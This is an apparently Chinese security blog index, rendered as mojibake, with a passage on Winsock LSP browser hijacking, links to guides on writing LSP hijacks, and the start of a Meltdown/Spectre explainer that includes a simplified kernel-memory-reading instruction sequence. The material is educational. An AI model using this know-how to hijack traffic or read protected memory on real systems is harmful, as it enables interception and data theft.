Provider(åˆ†å±‚æœåŠ¡æä¾›å•†)ï¼Œå®ƒæ˜¯Windowsåº•å±‚ç½‘ç»œSockeré€šä¿¡éœ€è¦ç»è¿‡çš„å¤§é—¨ã€‚ä¸€äº›æµæ°“è½¯ä»¶å¯ä»¥æŠŠè‡ªå·²åŠ è¿›å»ï¼Œå°±å¯ä»¥æˆªå–ã€è®¿é—®ã€ä¿®æ”¹ç½‘ç»œçš„æ•°æ®åŒ…ï¼Œå¯ä»¥éšæ„æ·»åŠ å¹¿å‘Šï¼Œè¿˜èƒ½è·å–ä½ çš„æµè§ˆä¹ æƒ¯.å¦‚æœåŠ è¿›çš„æ˜¯æœ¨é©¬ï¼Œåæœå¯æƒ³è€ŒçŸ¥ã€‚è€Œä¸”å› ä¸ºLSPå·¥ä½œåœ¨åº•å±‚ï¼Œæ‰€ä»¥æ— è®ºä½ ç”¨ä»€ä¹ˆæµè§ˆå™¨ï¼Œéƒ½é€ƒä¸äº†ç»è¿‡å®ƒã€‚è€ŒLSPä¸­çš„dllæ–‡ä»¶è¢«åˆ é™¤åï¼Œå°±ä¼šå‡ºç°æ— æ³•ä¸Šç½‘çš„æƒ…å†µã€‚\nWinsock LSP å¯ç”¨äºéå¸¸å¹¿æ³›çš„å®ç”¨ç”¨é€”ï¼ŒåŒ…æ‹¬ Internet å®¶é•¿æ§åˆ¶ (parental control) å’Œ Web å†…å®¹ç­›é€‰ã€‚åœ¨ä»¥å‰ç‰ˆæœ¬çš„ Windows XP ä¸­ï¼Œåˆ é™¤ä¸æ­£ç¡®çš„ï¼ˆä¹Ÿç§°ä¸ºâ€œbuggyâ€ï¼‰LSP å¯èƒ½ä¼šå¯¼è‡´æ³¨å†Œè¡¨ä¸­çš„ Winsock ç›®å½•æŸåï¼Œæ½œåœ¨çš„å¯¼è‡´æ‰€æœ‰ç½‘ç»œè¿æ¥çš„ä¸¢å¤±ã€‚ LSPå°±æ˜¯TCP/IPç­‰åè®®çš„æ¥å£ï¼LSPç”¨åœ¨æ­£é€”ä¸Šå¯ä»¥æ–¹ä¾¿ç¨‹åºå‘˜ä»¬ç¼–å†™ç›‘è§†ç³»ç»Ÿç½‘ç»œé€šè®¯æƒ…å†µçš„Snifferï¼Œå¯æ˜¯ç°åœ¨å¸¸è§çš„LSPéƒ½è¢«ç”¨äºæµè§ˆå™¨åŠ«æŒã€‚\nç°åœ¨å¤§å¤šåŠ é€Ÿå™¨ï¼Œå°¤å…¶ä»¥è…¾è®¯ç³»ä¸ºä¸»çš„å¤§å¤šåº”ç”¨ï¼ˆè…¾è®¯åŠ é€Ÿå™¨ï¼ŒTGP(ç°wegame)ï¼Œéƒ½æ˜¯ä»¥lspåŠ«æŒåˆ°è‡ªå·±çš„èŠ‚ç‚¹è¿›è¡ŒåŠ é€Ÿ\néæ­£å¸¸å¸è½½(æ¯”å¦‚å¼ºè¡Œåˆ é™¤åŠ é€Ÿå™¨æ–‡ä»¶)é€šå¸¸ä¼šå¸¦æ¥æ— æ³•ä¸Šç½‘çš„é—®é¢˜ã€‚\n å¦‚ä½•ç¼–å†™lspåŠ«æŒï¼š\nhttps://blog.csdn.net/Aaron133/article/details/78028942\nhttps://www.cnblogs.com/freesec/p/6541725.html\nhttps://www.cnblogs.com/hjbf/p/10195244.html\nhttps://blog.csdn.net/sspdfn/article/details/86520816\n windows10 è§£å†³åŠæ³•\n1  $ netsh winsock reset   PSï¼šç”¨pingæ£€æŸ¥ç½‘ç»œçŠ¶å†µ\n1 2 3 4 5  ping 127.0.0.1(åˆ¤æ–­æœ¬åœ°tcp/ipåè®®æ˜¯å¦æ­£å¸¸)ï¼Œ #ping æœ¬åœ°ip (åˆ¤æ–­ç½‘å¡æ˜¯å¦æ­£å¸¸)ï¼Œ ping gateway_ip # ç½‘å…³(åˆ¤æ–­è·¯ç”±å™¨æ˜¯å¦æ­£å¸¸)ï¼Œ ping 14.215.177.39 # å¤–ç½‘ipï¼Œç™¾åº¦çš„ip (åˆ¤æ–­ç½‘ç»œè¿æ¥æ˜¯å¦æ­£å¸¸),  ping baidu.com # å¤–ç½‘åŸŸå(åˆ¤æ–­DNSæ˜¯å¦æ­£å¸¸)ï¼Œ   ","description":"","tags":[],"title":"lsp-hijack","uri":"/posts/lsp-hijack/"},{"categories":["hardware","security","cpu"],"content":"0x00 åº ç”±äºæ–°å‹å† çŠ¶ç—…æ¯’ï¼Œç¾è‚¡å¤šæ¬¡ç†”æ–­ï¼Œæˆ‘ä»¬çš„å®‰å…¨è¯¾ä¹Ÿæåˆ°äº†ç†”æ–­ä¸€è¯ï¼šMeltdownï¼Œå°†å…¶ä¸ç¡¬ä»¶å®‰å…¨è”ç³»åœ¨äº†ä¸€èµ·\nMeltdownï¼Œæºè‡ªäº2018å¹´1æœˆ3æ—¥çš„ä¸¤ç»„CPUèŠ¯ç‰‡æ¼æ´ä¹‹ä¸€\n 2018å¹´1æœˆ3æ—¥ï¼ŒGoogle Project Zeroï¼ˆGPZï¼‰å›¢é˜Ÿå®‰å…¨ç ”ç©¶å‘˜Jann Hornåœ¨å…¶å›¢é˜Ÿåšå®¢ä¸­çˆ†å‡ºCPUèŠ¯ç‰‡çš„ä¸¤ç»„æ¼æ´ï¼Œåˆ†åˆ«æ˜¯Meltdownä¸Spectreã€‚\n Meltdownå¯¹åº”CVE-2017-5754ï¼ˆä¹±åºæ‰§è¡Œç¼“å­˜æ±¡æŸ“ï¼‰ï¼ŒSpectreå¯¹åº”CVE-2017-5753ï¼ˆè¾¹ç•Œæ£€æŸ¥ç»•è¿‡ï¼‰ä¸CVE-2017-5715ï¼ˆåˆ†æ”¯ç›®æ ‡æ³¨å…¥ï¼‰ã€‚çœ‹CVEç¼–å·å°±èƒ½çŸ¥é“ï¼Œè¿™ä¸¤ç»„æ¼æ´æ—©åœ¨2017å¹´6æœˆå°±å·²ç»ç”±GPZå›¢é˜Ÿå‘è‹±ç‰¹å°”æäº¤ï¼Œè€Œåœ¨å·®ä¸å¤šæ—¶é—´ç”±Lippç­‰äººå‘å¸ƒçš„è®ºæ–‡Meltdownä¸Spectre Attacksä¹Ÿè¯¦ç»†æè¿°äº†è¿™ä¸€æ”»å‡»ï¼Œä»æ–‡ä¸­çš„å£°æ˜æ¥çœ‹ï¼ŒLippç­‰äººä¸GPZå›¢é˜Ÿä¼¼ä¹æ˜¯ç‹¬ç«‹å‘ç°äº†è¿™ä¸¤ç»„æ¼æ´ã€‚\nMeltdownæ¼æ´å½±å“å‡ ä¹æ‰€æœ‰çš„Intel CPUå’Œéƒ¨åˆ†ARM CPUï¼Œè€ŒSpectreåˆ™å½±å“æ‰€æœ‰çš„Intel CPUå’ŒAMD CPUï¼Œä»¥åŠä¸»æµçš„ARM CPUã€‚ä»ä¸ªäººç”µè„‘ã€æœåŠ¡å™¨ã€äº‘è®¡ç®—æœºæœåŠ¡å™¨åˆ°ç§»åŠ¨ç«¯çš„æ™ºèƒ½æ‰‹æœºï¼Œéƒ½å—åˆ°è¿™ä¸¤ç»„ç¡¬ä»¶æ¼æ´çš„å½±å“ã€‚\næ€»æ‰€å‘¨çŸ¥ï¼Œè½¯ä»¶æ›´æ¢è‚¯å®šæ¯”ç¡¬ä»¶æ›´æ¢å®¹æ˜“ï¼Œè½¯ä»¶æŸä¸ªç‰ˆæœ¬æœ‰äº†bugæˆ–æ¼æ´ï¼Œæˆ‘ä»¬å¤§å¯æ¢å…¶ç‰ˆæœ¬ï¼Œé‡è£…å°±å®Œäº‹äº†ï¼Œæˆ–è€…ä¸ç”¨ä»–ä¸”ç½¢ï¼Œä½†æ˜¯å¯¹äºç¡¬ä»¶çº§çš„æ¼æ´ï¼Œæˆ‘ä»¬ä¹Ÿåªèƒ½ä»è½¯ä»¶å±‚é¢ä¿®å¤æ‰“è¡¥ä¸ï¼Œæˆ–è€…ä¹Ÿå°±åªèƒ½ç­‰ç€ä¿®å¤äº†æ¼æ´çš„æ–°ç‰ˆCPUå‘å¸ƒäº†ï¼Œä¸è¿‡æ¢CPUä¹Ÿæ˜¯ä¸€ä»¶éº»çƒ¦äº‹ã€‚\n å‚è€ƒï¼š\nMeltdown and Spectre\nGithub - IAIK / meltdown\nGithub - paboldin / meltdown-exploit\nGithub - speed47 / spectre-meltdown-checker\nMeltdown.pdfâ€”â€”æ¼æ´å‘ç°è€…çš„è®ºæ–‡\nMeltdown.pdfâ€”â€”è®ºæ–‡ç¿»è¯‘\nä¸€æ­¥ä¸€æ­¥ç†è§£CPUèŠ¯ç‰‡æ¼æ´ï¼šMeltdownä¸Spectreï¼šå…¶ä¸­åˆ†æçš„expæ˜¯è¿™ä¸ªGithub - paboldin / meltdown-exploit\nMeltdownæ¼æ´åˆ©ç”¨è§£è¯»ï¼ˆPart 1ï¼‰ï¼šåŸºç¡€ç¯‡\né¦–å‘ï¼šMeltdownæ¼æ´åˆ†æä¸å®è·µ\nç†è§£CPU Spectreæ¼æ´\nè§£è¯» Meltdown \u0026 Spectre CPU æ¼æ´\nç»™ç¨‹åºå‘˜è§£é‡ŠSpectreå’ŒMeltdownæ¼æ´\nä¿®å¤ï¼š\nå²ä¸Šæœ€å¤§CPUæ¼æ´Meltdown \u0026 Spectre å½±å“ä¸ä¿®å¤æŒ‡å—\n 0x01 æ¼æ´åŸç† è®¡ç®—æœºæ“ä½œç³»ç»Ÿæœ‰ä¸€ä¸ªæœ€åŸºæœ¬çš„å®‰å…¨ç›®æ ‡ï¼šä¿è¯ç”¨æˆ·ç¨‹åºä¸èƒ½ä»»æ„è®¿é—®å†…æ ¸/å…¶ä»–ç”¨æˆ·ç¨‹åºçš„å†…å­˜ã€‚ä¸€æ—¦æŸä¸ªæ¶æ„åº”ç”¨å¯ä»¥ä»»æ„è®¿é—®å…¶ä»–åº”ç”¨ç¨‹åº/æ“ä½œç³»ç»Ÿçš„å†…å­˜ï¼Œé‚£ä¹ˆåæœåˆ™ä¸å ªè®¾æƒ³ã€‚\nä¸ºäº†å®ç°è¿™ä¸ªç›®æ ‡ï¼Œæ“ä½œç³»ç»Ÿå’Œè®¡ç®—æœºç¡¬ä»¶ï¼ˆCPUï¼‰é‡‡å–äº†ä»¥ä¸‹æªæ–½ï¼š\n æ“ä½œç³»ç»Ÿï¼šé€šè¿‡è™šæ‹Ÿå†…å­˜ä¸ºæ¯ä¸ªåº”ç”¨ç¨‹åºå’Œå†…æ ¸å¼€è¾Ÿç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œè§„å®šç›¸åº”çš„è®¿é—®æƒé™ã€‚ CPUï¼šé€šè¿‡ç¡¬ä»¶å®ç°æ”¯æŒè™šæ‹Ÿå†…å­˜ï¼ˆTLBï¼‰åŠå…¶ç›¸åº”çš„è®¿é—®æƒé™ã€‚  ä¸¾ä¾‹æ¥è®²ï¼Œå¦‚æœæœ‰ä¸€ä¸ªç”¨æˆ·ç¨‹åºè¯•å›¾è®¿é—®ä¸€ä¸ªå†…æ ¸çš„å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆåœ¨CPUæ‰§è¡Œç›¸åº”æŒ‡ä»¤çš„è¿‡ç¨‹ä¸­ä¼šæ¢æµ‹åˆ°æ²¡æœ‰è®¿é—®æƒé™ï¼Œè¿›è€Œè§¦å‘ä¸­æ–­/å¼‚å¸¸ï¼Œå¯¼è‡´ç¨‹åºç»ˆç»“ã€‚\næ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé™¤éæ¶æ„ç¨‹åºé€šè¿‡è½¯ä»¶æ¼æ´ææƒè·å¾—äº†å†…æ ¸æƒé™ï¼Œå¦åˆ™æ˜¯æ— è®ºå¦‚ä½•ä¹Ÿç»•ä¸è¿‡CPU çš„æƒé™æ£€æŸ¥ä»è€Œèƒ½è®¿é—®å†…æ ¸åœ°å€çš„ã€‚\nå…·ä½“æ¥çœ‹ï¼Œå‡è®¾éæ³•è®¿é—®å†…å­˜çš„æŒ‡ä»¤ä¸º\n1  mov rax byte[x] // å°†å†…æ ¸åœ°å€xå¤„çš„å†…å®¹å­˜åˆ°å¯„å­˜å™¨rax   æ“ä½œç³»ç»Ÿä¼šäº‹å…ˆæ ‡æ³¨å¥½å†…æ ¸çš„å†…å­˜åœ°å€èŒƒå›´ï¼Œå¦‚æœ x åœ¨å†…æ ¸çš„è¿™ä¸ªåœ°å€èŒƒå›´å†…ï¼Œå¹¶ä¸” CPU ä¸æ˜¯ä»¥å†…æ ¸æ¨¡å¼è¿è¡Œçš„è¯ï¼Œé‚£ä¹ˆè¯¥æŒ‡ä»¤ä¼šè¢« CPU æ ‡æ³¨ä¸ºéæ³•ï¼Œå¼•èµ·å¼‚å¸¸ï¼Œå¼‚å¸¸å¤„ç†ç¨‹åºä¼šå°† rax æ¸…ç©ºä¸º0ï¼Œå¹¶ä¸”ç»ˆç»“æ­¤ç¨‹åºï¼Œè¿™æ ·åç»­æŒ‡ä»¤å†æ¥è¯» rax çš„æ—¶å€™å°±åªèƒ½è¯»åˆ°0äº†ã€‚ç›®å‰çœ‹æ¥è¿™ä¸€æ•´å¥—æµç¨‹è¿˜æ˜¯æ— æ‡ˆå¯å‡»çš„ã€‚\nç„¶è€Œè¿™é‡Œä¸€ä¸ªé‡è¦çš„å‰æå‡è®¾æ˜¯ï¼šCPU åœ¨åšæƒé™æ£€æŸ¥å¹¶ä¸”å°† rax æ¸…é›¶çš„è¿‡ç¨‹ä¸­ï¼Œä¸ä¼šæ³„éœ²ä»»ä½•å…³äº [x] çš„ä¿¡æ¯ã€‚\nä¸€èˆ¬çš„æ¶æ„æ”»å‡»è€…ï¼Œé‡‡ç”¨çš„æ˜¯å‰ä¸€ç§æ–¹æ³•è¿›è¡Œæ”»å‡»ï¼šææƒï¼Œè®©CPUé€šè¿‡æƒé™æ£€æŸ¥ï¼Œç„¶è€ŒMeltdownå´å¦è¾Ÿè¹Šå¾„ï¼Œåœ¨ rax å¯„å­˜å™¨æ¸…é›¶çš„è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨äº†ä¾§ä¿¡é“æ”»å‡»è·å–ä¿¡æ¯\nMeltdownå’ŒSpectreè¿™ä¸¤ä¸ªæ¼æ´åˆ©ç”¨äº†è¿™ä¸ªè¿‡ç¨‹ï¼Œä»–ä»¬æ¥æºäºèŠ¯ç‰‡å‚å•†ä¸ºäº†æé«˜CPUæ€§èƒ½è€Œå¼•å…¥çš„ä¸¤ç§ç‰¹æ€§ï¼šä¹±åºæ‰§è¡Œï¼ˆOut-of-Order Executionï¼‰å’Œé¢„æµ‹æ‰§è¡Œ(Speculative Execution)ã€‚\nä¹±åºæ‰§è¡Œå’Œé¢„æµ‹æ‰§è¡Œ ä¹±åºæ‰§è¡Œ ç®€å•æ¥è¯´ï¼Œç°ä»£CPUæ‰§è¡Œæ•ˆç‡å¤ªé«˜ï¼Œä½†æ˜¯å†…å­˜è®¿é—®ç«¯çš„é€Ÿåº¦è·Ÿä¸ä¸Šï¼Œå› æ­¤ç°ä»£å¤„ç†å™¨ä¸ºäº†æé«˜æ€§èƒ½å¹¶ä¸ä¸¥æ ¼æŒ‰ç…§æŒ‡ä»¤çš„é¡ºåºä¸²è¡Œæ‰§è¡Œï¼Œè€Œæ˜¯å¯¹æ‰§è¡Œè¿›è¡Œç›¸å…³æ€§åˆ†æåå¹¶è¡Œå¤„ç†ä¹±åºæ‰§è¡Œã€‚æ¯”å¦‚å½“å¤„ç†å™¨ä¸­çš„æŸäº›æŒ‡ä»¤éœ€è¦ç­‰å¾…æŸäº›èµ„æºï¼Œå¤„ç†å™¨ä¸ä¼šçœŸçš„åœ¨è¿™é‡Œç­‰å¾…è€Œåœæ­¢æŒ‡ä»¤çš„æ‰§è¡Œï¼Œè€Œæ˜¯åˆ©ç”¨ç­‰å¾…èµ„æºçš„æ—¶é—´ç»§ç»­æ‰§è¡Œåç»­çš„æŒ‡ä»¤ã€‚åœ¨æ”¯æŒä¹±åºæ‰§è¡Œçš„CPUä¸­ï¼Œåé¢çš„æŒ‡ä»¤å¯èƒ½åœ¨å‰é¢æŒ‡ä»¤æ‰§è¡Œç»“æŸå‰å°±å¼€å§‹æ‰§è¡Œäº†ã€‚ï¼ˆä¸¤ä¸ªæ¼æ´çš„ä¸‡æ¶ä¹‹æºï¼‰\nä½†æ˜¯ä¸ºäº†ä¿è¯ç¨‹åºè¿è¡Œçš„æ­£ç¡®æ€§ï¼Œå¤„ç†å™¨ä¼šå¯¹æŒ‡ä»¤æ‰§è¡Œå®‰å…¨æ£€æŸ¥ï¼Œåªæœ‰å½“å‰ç”¨æˆ·æƒé™ç¬¦åˆæŒ‡ä»¤æƒé™æ—¶æ‰èƒ½è¢«æ‰§è¡Œï¼Œæ¯”å¦‚ç”¨æˆ·ç©ºé—´çš„æŒ‡ä»¤è®¿é—®å†…æ ¸å†…å­˜å¤„ç†å™¨å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ç„¶è€Œå®‰å…¨æ£€æŸ¥è¿™ä¸ªæ“ä½œåªæœ‰åœ¨æŒ‡ä»¤é€€ä¼‘ï¼ˆretirementâ€”â€”ä¸€æ¡æŒ‡ä»¤é€€ä¼‘åªæœ‰å½“å®ƒçš„æ‰§è¡Œçš„ç»“æœçœŸæ­£è¢«æäº¤å¹¶å¯¹ç³»ç»Ÿå¯è§æ—¶æ‰ä¼šå‘ç”Ÿï¼‰æ—¶æ‰ä¼šè¿›è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåœ¨ä¹±åºæ‰§è¡Œä¸­ï¼ŒæŒ‡ä»¤å¹¶æ²¡æœ‰çœŸæ­£æ‰§è¡Œå®Œæˆè€Œåªæ˜¯åŠ è½½åˆ°ç¼“å­˜ä¸­ï¼ˆä¸‹æ–‡ä¼šæï¼‰æ˜¯ä¸ä¼šæ‰§è¡Œå®‰å…¨æ£€æŸ¥çš„ã€‚è€Œæ­¤æ—¶ç”±äºä¹±åºæ‰§è¡Œè€Œè¢«æå‰æ‰§è¡Œçš„æŒ‡ä»¤ä¼šè¢«å¤„ç†å™¨ä¸¢å¼ƒï¼Œä½†ç”±äºä¹±åºæ‰§è¡Œçš„æŒ‡ä»¤å¯¹ç¼“å­˜çš„æ“ä½œåœ¨è¿™äº›æŒ‡ä»¤è¢«ä¸¢å¼ƒæ—¶ä¸ä¼šè¢«é‡ç½®ã€‚æ­£æ˜¯å®‰å…¨æ£€æŸ¥ä¸ä¹±åºæ‰§è¡Œçš„ç©ºçª—æœŸæ‰ä¼šè®©Meltdownæœ‰æœºå¯ä¹˜ã€‚\né¢„æµ‹æ‰§è¡Œ é¢„æµ‹æ‰§è¡Œæ¶‰åŠåˆ°ç¨‹åºçš„æ§åˆ¶æµï¼Œç°åœ¨å¤„ç†å™¨ä¸æ˜¯å»è§£ææ‰€æœ‰åˆ†æ”¯æŒ‡ä»¤åç„¶åå†³å®šæ‰§è¡Œå“ªä¸ªæ“ä½œï¼Œè€Œæ˜¯é¢„æµ‹å“ªä¸ªæ§åˆ¶æµä¼šæ›´æœ‰å¯èƒ½è¢«è¿è¡Œå†æå–ç›¸åº”çš„æŒ‡ä»¤ä»£ç æ‰§è¡Œã€‚å¦‚æœé¢„æµ‹æ­£ç¡®çš„è¯ï¼Œä¼šå¸¦æ¥å¾ˆé«˜çš„æ€§èƒ½æå‡å¹¶æé«˜å¤„ç†å™¨çš„å¹¶è¡Œæ€§ã€‚å¦‚æœé¢„æµ‹é”™è¯¯ï¼Œé‚£äº›è¢«é¢„æµ‹æ‰§è¡Œçš„ä¸æ­£ç¡®ç»“æœä¼šè¢«ä¸¢å¼ƒï¼Œå¤„ç†å™¨ä¼šå°†çŠ¶æ€æ¢å¤åˆ°é¢„æµ‹æ‰§è¡Œè¡Œå‰çš„æ­£ç¡®çŠ¶æ€ï¼Œå†é‡æ–°è·³è½¬åˆ°æ­£ç¡®æ‰§è¡Œçš„åˆ†æ”¯æˆ–æŒ‡ä»¤ä¸­è¿è¡Œã€‚ä¸ä¹±åºæ‰§è¡Œç±»ä¼¼ï¼Œé¢„æµ‹æ‰§è¡Œå¯¹å¤„ç†å™¨ç¼“å­˜çš„æ“ä½œä¼šè¢«ä¿ç•™ã€‚\næ”»å‡» è¿™ç§æœºåˆ¶ä»å®è§‚ä¸Šçœ‹ä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†ç”±äºå¤„ç†å™¨çš„ç¼“å­˜ï¼ˆcacheï¼‰æœºåˆ¶ï¼Œé‚£äº›è¢«é¢„æµ‹æ‰§è¡Œæˆ–ä¹±åºæ‰§è¡Œçš„æŒ‡ä»¤ä¼šè¢«å…ˆåŠ è½½åˆ°ç¼“å­˜ä¸­ï¼Œä½†åœ¨å¤„ç†å™¨æ¢å¤çŠ¶æ€æ—¶å¹¶ä¸ä¼šæ¢å¤å¤„ç†å™¨ç¼“å­˜çš„å†…å®¹ã€‚è€Œæœ€æ–°çš„ç ”ç©¶è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç¼“å­˜è¿›è¡Œä¾§ä¿¡é“æ”»å‡»ï¼Œè€ŒMeltdownä¸Spectreä»æœ¬è´¨ä¸Šæ¥çœ‹å±äºåˆ©ç”¨å¤„ç†å™¨çš„ä¹±åºæ‰§è¡Œæˆ–é¢„æµ‹æ‰§è¡Œæ¼æ´è¿›è¡Œçš„ç¼“å­˜ä¾§ä¿¡é“æ”»å‡»ã€‚\n   ç¼“å­˜ä¾§ä¿¡é“æ”»å‡»   ç¼“å­˜é€šè¿‡æ•°æ®å…±äº«æ¥åŠ å¿«æ•°æ®è®¿é—®ï¼Œä¹Ÿå°±æ˜¯è¯´ç¼“å­˜å‘½ä¸­ä¸å¤±æ•ˆå¯¹åº”çš„å“åº”æ—¶é—´æ˜¯æœ‰å·®åˆ«çš„ï¼Œæ”»å‡»è€…æ­£æ˜¯åˆ©ç”¨è¿™ç§æ—¶é—´çš„å·®å¼‚æ€§æ¥æ¨æµ‹ç¼“å­˜ä¸­çš„ä¿¡æ¯ï¼Œä»è€Œè·å¾—éšç§æ•°æ®ã€‚ç¼“å­˜ä¾§ä¿¡é“æ”»å‡»ä¸»è¦æœ‰Evict+Time[7]ã€Prime+Probe[6])ä¸Flush+Reload[5]ç­‰æ”»å‡»æ–¹å¼ï¼Œè¿™é‡Œä¸»è¦ç®€å•ä»‹ç»ä¸€ä¸‹Flush+Reloadï¼Œä¹Ÿæ˜¯ä¸‹æ–‡meltdownçš„exploitä¸­åˆ©ç”¨çš„æ–¹æ³•ã€‚\nå‡è®¾æ”»å‡»è€…å’Œç›®æ ‡ç¨‹åºå…±äº«ç‰©ç†å†…å­˜ï¼ˆä¹Ÿå¯ä»¥æ˜¯äº‘ä¸­ä¸åŒè™šæ‹Ÿæœºå…±äº«å†…å­˜ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åå¤åˆ©ç”¨å¤„ç†å™¨æŒ‡ä»¤å°†ç›‘æ§çš„å†…å­˜å—ï¼ˆæŸäº›åœ°å€ï¼‰ä»ç¼“å­˜ä¸­é©±é€å‡ºå»ï¼Œç„¶ååœ¨ç­‰å¾…ç›®æ ‡ç¨‹åºè®¿é—®å…±äº«å†…å­˜ï¼ˆFlushé˜¶æ®µï¼‰ã€‚ç„¶åæ”»å‡»è€…é‡æ–°åŠ è½½ç›‘æ§çš„å†…å­˜å—å¹¶æµ‹é‡è¯»å–æ—¶é—´(Reloadé˜¶æ®µ)ï¼Œå¦‚æœè¯¥å†…å­˜å—è¢«ç›®æ ‡ç¨‹åºè®¿é—®è¿‡ï¼Œå…¶å¯¹åº”çš„å†…å­˜ä¼šè¢«å¯¼å…¥åˆ°å¤„ç†å™¨ç¼“å­˜ä¸­ï¼Œåˆ™æ”»å‡»è€…å¯¹è¯¥å†…å­˜çš„è®¿é—®æ—¶é—´å°†ä¼šè¾ƒçŸ­ã€‚é€šè¿‡æµ‹é‡åŠ è½½æ—¶é—´çš„é•¿çŸ­ï¼Œæ”»å‡»è€…å¯ä»¥æ¸…æ¥šåœ°çŸ¥é“è¯¥å†…å­˜å—æ˜¯å¦è¢«ç›®æ ‡ç¨‹åºè¯»å–è¿‡ã€‚\nMeltdownä¸Spectreåˆ©ç”¨è¿™ç§ä¾§ä¿¡é“å¯ä»¥è¿›è¡Œè¶Šæƒå†…å­˜è®¿é—®ï¼Œç”šè‡³è¯»å–æ•´ä¸ªå†…æ ¸çš„å†…å­˜æ•°æ®ã€‚\n Meltdownæ”»å‡»æŒ‡ä»¤åºåˆ— ä»¥ä¸€ä¸ªç®€åŒ–çš„meltdownæ”»å‡»æŒ‡ä»¤åºåˆ—ä¸ºä¾‹\n; rcx = kernel address ; rbx = probe_array mov rax, byte [rcx] shl rax, 0xc mov rbx, qword [rbx + rax]   rcxä¸ºæˆ‘ä»¬éæ³•è®¿é—®çš„å†…æ ¸åœ°å€ï¼Œrcxå¯„å­˜å™¨å­˜æ”¾ç”¨æˆ·ç©ºé—´ç¨‹åºä¸å¯è®¿é—®çš„å†…æ ¸åœ°å€\n  rbxä¸ºæˆ‘ä»¬ç”¨æˆ·ç©ºé—´ä¸­çš„ä¸€ä¸ªæ•°ç»„ï¼Œrbxå¯„å­˜å™¨æŒ‡å‘æ¢æµ‹æ•°ç»„probe_array\n  mov des srcï¼Œå°†srcçš„æ•°æ®ç§»åˆ°desé‡Œï¼Œç¬¬ä¸‰è¡Œçš„æ˜¯å°è¯•å°†å†…æ ¸åœ°å€ä¸­çš„ä¸€ä¸ªå­—èŠ‚ç§»åˆ°raxå¯„å­˜å™¨ä¸­ï¼Œæ˜¯ä¸€ä¸ªéæ³•æ“ä½œã€‚è¯¥æ¡æŒ‡ä»¤è§†å›¾è®¿é—®å†…æ ¸åœ°å€ï¼Œå¤„ç†å™¨ä¼šå¯¹å…¶è¿›è¡Œä½œå®‰å…¨æ£€æŸ¥ï¼Œæ£€æŸ¥è¯¥è¿›ç¨‹æ˜¯å¦æœ‰æƒé™è®¿é—®è¯¥åœ°å€ã€‚ç”±äºæˆ‘ä»¬æ˜¯ä»¥æ™®é€šç”¨æˆ·å»æ‰§è¡Œçš„ï¼Œå› æ­¤è¿™æ¡æŒ‡ä»¤ä¼šè§¦å‘å¼‚å¸¸ï¼Œè¯¥æŒ‡ä»¤åŠä¹‹åçš„æŒ‡ä»¤å¯¹å¯„å­˜å™¨çš„ä¿®æ”¹éƒ½ä¼šè¢«ä¸¢å¼ƒï¼Œè¿™æ ·å¤„ç†å™¨èƒ½å¤Ÿå›åˆ°æ­£å¸¸æ‰§è¡Œçš„æŒ‡ä»¤ä¸­ï¼Œä½†ç”±äºå¤„ç†å™¨é‡‡ç”¨ä¹±åºæ‰§è¡Œçš„æ–¹å¼ï¼Œåœ¨ç­‰å¾…å¤„ç†å™¨å®Œæˆè¯¥æŒ‡ä»¤çš„åŒæ—¶ï¼ˆæƒé™æ£€æŸ¥ç»“æŸä¹‹å‰ï¼‰ï¼Œåä¸¤æ¡å·²ç»æ‰§è¡Œäº†ï¼Œå°½ç®¡ä»–ä»¬éƒ½ä¼šè¢«ä¸¢å¼ƒ\n  shl des srcï¼Œå°†srcé€»è¾‘å·¦ç§»desä½ï¼Œè¿™é‡Œå°†è¯»åˆ°çš„æ•°æ®ä¹˜ä»¥4096ï¼ˆ4KBï¼Œ0xC,æ­£å¥½ä¸ºx86æ¶æ„ä¸­çš„ä¸€ä¸ªé¡µçš„å¤§å°4KBï¼‰\n  ç¬¬äº”è¡ŒæŒ‡ä»¤å°†ä¸Šä¸€æ¡ä½œä¸ºç´¢å¼•ï¼Œå¯¹rbxæ¢æµ‹æ•°ç»„è¿›è¡Œæ¢æµ‹ï¼Œç®€å•æ¥è¯´å°±æ˜¯éå†è¿™ä¸ªæ•°ç»„ã€‚ç†è®ºä¸Šè®²ï¼Œæ‰§è¡Œç¬¬å››è¡ŒæŒ‡ä»¤æ—¶ï¼Œraxå°±åº”è¯¥æ¸…é›¶äº†ï¼Œä½†æ˜¯ç”±äºä¹±åºæ‰§è¡Œï¼Œç¬¬å››è¡Œå’Œç¬¬äº”è¡Œçš„æŒ‡ä»¤å°†ä¼šè¢«æ‰§è¡Œï¼ŒçŸ¥é“å¼‚å¸¸å¤„ç†çš„æ—¶å€™ï¼Œå°† rbx å’Œ rax æ¸…é›¶ã€‚\n  ç›®å‰çœ‹èµ·æ¥ç¡®å®æ²¡å•¥é—®é¢˜ï¼Œå› ä¸ºrbxä¹Ÿä¼šæ¸…é›¶ï¼Œä»»ä½•å…³äºå†…æ ¸åœ°å€çš„ä¿¡æ¯éƒ½æ²¡æœ‰ç•™ä¸‹æ¥ã€‚\nä½†æ˜¯é—®é¢˜çš„å…³é”®å°±åœ¨ç¬¬ä¸‰è¡ŒæŒ‡ä»¤ï¼šå¦‚æœåœ°å€ rbx + rax ä¸åœ¨cacheä¸­çš„è¯ï¼ŒCPU ä¼šè‡ªåŠ¨å°†è¿™ä¸€åœ°å€è°ƒå…¥cacheä¸­ï¼Œä»¥ä¾¿ä¹‹åè®¿é—®æ—¶è·å¾—æ›´å¥½çš„æ€§èƒ½ï¼Œç„¶è€Œå¼‚å¸¸å¤„ç†å¹¶ä¸ä¼šå°†è¿™ä¸ªcache flushæ‰ã€‚è€Œè¿™æ¡ cache çš„åœ°å€æ˜¯å’Œ rax ç›´æ¥ç›¸å…³çš„ï¼Œè¿™æ ·å°±ç›¸å½“äºåœ¨ CPU ç¡¬ä»¶ä¸­ç•™ä¸‹äº†å’Œ rax ç›¸å…³çš„ä¿¡æ¯ã€‚\né‚£ä¹ˆå¦‚ä½•è¿˜åŸ rbx + rax 